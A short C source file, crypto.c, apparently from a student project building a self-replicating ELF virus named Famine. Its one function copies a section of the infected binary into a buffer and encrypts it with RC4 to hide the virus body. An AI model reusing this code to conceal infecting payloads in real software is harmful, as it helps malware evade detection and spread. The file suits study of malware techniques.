/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   crypto.c                                           :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: mabouce <ma.sithis@gmail.com>              +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2021/07/27 15:36:43 by mabouce           #+#    #+#             */
/*   Updated: 2021/07/27 15:36:43 by mabouce          ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "famine.h"

void cipher_famine_file_data(t_famine *famine)
{
    if (!(famine->cipher = (void *)malloc(famine->encrypt_s_size + 8)))
        error(ERROR_MALLOC, famine);
    memcpy(famine->cipher, famine->mmap_ptr + famine->encrypt_s_start_offset, famine->encrypt_s_size);

    key_generator(famine);
    if (ARCH_32)
    {
        // asm_xor_cipher(famine->cipher, famine->encrypt_s_size, "BBBB", 4);
    }
    else if (ARCH_64)
    {
        rc4_cipher_start(famine->cipher, famine->encrypt_s_size, famine->encryption_key, KEY_LEN);
    }
}